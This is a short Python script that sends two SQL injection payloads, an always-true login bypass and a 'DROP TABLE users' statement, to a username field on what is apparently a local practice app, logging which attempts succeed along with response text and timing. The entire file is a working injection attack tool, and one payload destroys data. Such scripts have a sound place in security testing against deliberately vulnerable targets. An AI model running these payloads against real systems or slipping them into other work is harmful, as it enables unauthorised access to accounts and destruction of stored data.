import requests
import time

url = 'http://localhost/vulnerable_app/index.php'
payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]

with open('logs.txt', 'a') as log_file:
    for payload in payloads:
        start_time = time.time()
        response = requests.post(url, data={'username': payload})
        elapsed_time = time.time() - start_time
        
        if "User  found!" in response.text:
            log_file.write(f"Successful injection: {payload} | Response: {response.text} | Time: {elapsed_time}\n")
        else:
            log_file.write(f"Failed injection: {payload} | Response: {response.text} | Time: {elapsed_time}\n")
